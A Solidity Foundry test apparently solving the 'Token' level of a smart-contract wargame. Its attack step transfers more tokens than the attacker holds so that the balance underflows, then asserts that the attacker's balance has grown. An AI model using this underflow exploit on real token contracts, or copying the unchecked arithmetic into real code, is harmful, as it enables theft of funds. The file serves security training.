// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Token} from "../../src/Token/Level.sol";

interface IToken {
  function transfer(address _to, uint _value) external returns (bool);

  function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenTest is LevelFactory {
  IToken token;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    token = IToken(address(new Token(10 ether)));
    token.transfer(attacker, 20);
  }

  function testAttack() public {
    submitLevel("Token");
  }

  function _performTest() internal override {
    token.transfer(address(102), token.balanceOf(deployer));
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    assertGt(token.balanceOf(attacker), 20);

    return token.balanceOf(attacker) > 20;
  }
}


